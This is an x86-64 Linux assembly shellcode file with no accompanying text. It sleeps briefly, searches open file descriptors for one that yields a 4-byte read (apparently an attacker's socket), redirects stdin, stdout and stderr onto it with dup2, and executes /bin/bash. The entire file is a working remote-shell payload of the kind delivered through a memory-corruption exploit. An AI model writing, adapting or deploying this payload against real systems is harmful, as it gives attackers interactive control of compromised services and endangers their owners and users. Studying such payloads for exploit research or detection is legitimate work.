BITS 64

start:

	; nanosleep
	push 0
	push 2
	mov rax, 35
	mov rdi, rsp
	xor rsi, rsi
	syscall


	; find the socket fd
	sub rsp, 4
	mov rsi, rsp
	mov rdx, 4
	mov rdi, 2

read_loop:
	xor rax, rax
	inc rdi
	syscall
	cmp rax, 4
	jne read_loop

	; dup2 over stdin
	xor rax, rax
	mov al, 33
	xor rsi, rsi
	syscall

	; stdout
	xor rax, rax
	mov al, 33
	inc rsi
	syscall

	; stderr
	xor rax, rax
	mov al, 33
	inc rsi
	syscall

	; execve
	xor rax, rax
	mov al, 59
	jmp bin
_getme:
	pop rbx

	xor rcx, rcx
	push rcx
	push rbx
	mov rsi, rsp
	mov rdi, rbx
	xor rdx, rdx	
	syscall

bin:
	call _getme
	db "/bin/bash", 0
	
